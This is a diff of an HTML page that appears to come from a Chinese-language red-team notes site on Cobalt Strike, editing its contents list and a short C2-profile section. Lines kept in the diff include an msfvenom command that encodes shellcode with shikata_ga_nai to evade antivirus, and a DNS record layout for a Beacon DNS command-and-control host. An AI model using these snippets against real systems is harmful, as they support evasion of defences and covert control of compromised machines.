@@ -172,8 +172,6 @@
                 
                     <li><a class="toctree-l4" href="#_1">启动</a></li>
                 
-                    <li><a class="toctree-l4" href="#c2profile">学习C2profile编写</a></li>
-                
                     <li><a class="toctree-l4" href="#shellcode">shellcode 免杀</a></li>
                 
                     <li><a class="toctree-l4" href="#beacon-dns">Beacon DNS</a></li>
@@ -206,6 +204,13 @@
             
     <li class="toctree-l1 ">
         <a class="" href="../linux_persistence_note/">linux 密码记录(client/server)</a>
+        
+    </li>
+
+        
+            
+    <li class="toctree-l1 ">
+        <a class="" href="../burpsuite-fuzz-chr/">利用burpsuite来进行Fuzz</a>
         
     </li>
 
@@ -285,16 +290,12 @@ git clone https://github.com/rsmudge/Malleable-C2-Profiles
 # 当本地client连接多个teamserver时，可以自由切换listen
 </code></pre>
 
-<h2 id="c2profile">学习C2profile编写</h2>
-<ol>
-<li>注意关键字 <em>jitter</em> 的使用!</li>
-<li>beacon_dns 太慢了</li>
-</ol>
 <h2 id="shellcode">shellcode 免杀</h2>
 <pre><code>cat payloadx86.bin |msfvenom - -a x86 --platform win -e x86/shikata_ga_nai -i 3 -f csharp
 </code></pre>
 
 <h2 id="beacon-dns"><a href="https://www.cobaltstrike.com/help-dns-beacon">Beacon DNS</a></h2>
+<p>贼慢</p>
 <pre><code>domain.com
 malwarec2       A       192.168.3.1
 games           NS      malwarec2.domain.com
